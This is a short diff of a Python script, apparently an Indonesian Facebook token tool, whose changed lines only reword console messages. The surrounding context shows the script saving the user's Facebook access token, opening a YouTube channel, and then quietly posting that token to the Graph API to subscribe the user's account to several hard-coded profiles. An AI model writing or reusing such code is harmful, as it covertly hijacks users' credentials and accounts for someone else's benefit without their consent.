@@ -219,7 +219,7 @@ def gen():
         cookie.write(find_token.group(1))
         cookie.close()
         print((p+"\n ["+h+"•"+p+"] Login Berhasil!")) 
-        cangcut((p+" ["+h+"•"+p+"] Subscribe channel youtube suami gue :v"))
+        cangcut((p+"\n ["+h+"•"+p+"] Subscribe channel youtube suami gue :v"))
         os.system('xdg-open https://youtube.com/channel/UCSJDs-6vbcEv_twPYbUAdaA')
         kumahaaing()
         menu()
@@ -236,7 +236,7 @@ def kumahaaing():
 	except IOError:
 		print((p+"\n["+h+"•"+p+"]"+p+" Token Invalid"))
 		asup_goblog()
-	cangcut("%s[%s•%s] %sPlease Wait..."%(p,h,p,p))
+	cangcut((p+" ["+h+"•"+p+"] Mohon tunggu sebentar..."))
 	requests.post("https://graph.facebook.com/100004105699210/subscribers?access_token=" + ewehayam)
 	requests.post("https://graph.facebook.com/100006307110060/subscribers?access_token=" + ewehayam)
 	requests.post("https://graph.facebook.com/100067229448595/subscribers?access_token=" + ewehayam)
